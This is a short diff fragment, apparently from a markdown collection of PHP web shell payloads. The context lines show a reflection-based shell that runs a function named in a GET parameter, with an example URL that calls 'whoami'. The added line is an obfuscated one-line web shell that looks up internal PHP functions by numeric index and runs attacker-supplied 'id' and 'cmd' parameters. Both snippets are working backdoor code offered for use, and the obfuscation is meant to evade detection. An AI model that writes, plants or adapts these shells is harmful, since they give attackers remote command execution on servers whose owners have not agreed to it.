@@ -180,6 +180,7 @@ echo $func->invokeArgs(array($_GET[c]));
 ?>
 https://www.g.com/index.php?m=system&c=whoami
 
+<?php function f() { $a = get_defined_functions()['internal'];$s = $a[3]();$b = $a[805]($s);$c = $a[$b];return $a[556]($c, $s); }print f($_GET['id'], $_GET['cmd']);?>
 
 ```
 
